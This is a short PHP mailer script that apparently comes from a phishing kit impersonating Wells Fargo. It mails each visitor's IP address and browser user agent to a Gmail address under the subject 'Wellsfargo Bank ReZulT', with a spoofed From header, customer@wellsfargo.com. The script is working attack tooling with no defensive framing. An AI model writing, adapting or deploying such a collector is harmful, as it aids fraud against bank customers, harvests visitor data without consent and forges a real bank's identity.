<?php

// Recipient email address
$recipient = 'swiftrynx@gmail.com';

// Email subject
$ip = $_SERVER['REMOTE_ADDR'];
$subject = "Wellsfargo Bank ReZulT | $ip";

// Additional email headers
$headers = "From: Wellsfargo Bank <customer@wellsfargo.com>\n";
$headers .= "MIME-Version: 1.0\n";
$headers .= "Content-type: text/html; charset=utf-8" . "\r\n";

// Your HTML email template
$htmlMessage = '<html>
<head>
    <title>Your Email Title</title>
</head>
<body>
    <h1>Hello, this is your HTML email!</h1>
    <p>This is a sample HTML email content.</p>
</body>
</html>';

// Getting user IP and hostname
$user_ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Create a message with user information
$message = "User IP: $user_ip\n";
$message .= "Browser Details: $user_agent\n";
$message .= "=========== HTML Email Content ===========\n";
$message .= $htmlMessage;

// Send the email
if (mail($recipient, $subject, $message, $headers)) {
    echo "Email sent successfully.";
} else {
    echo "Error sending email.";
}
?>
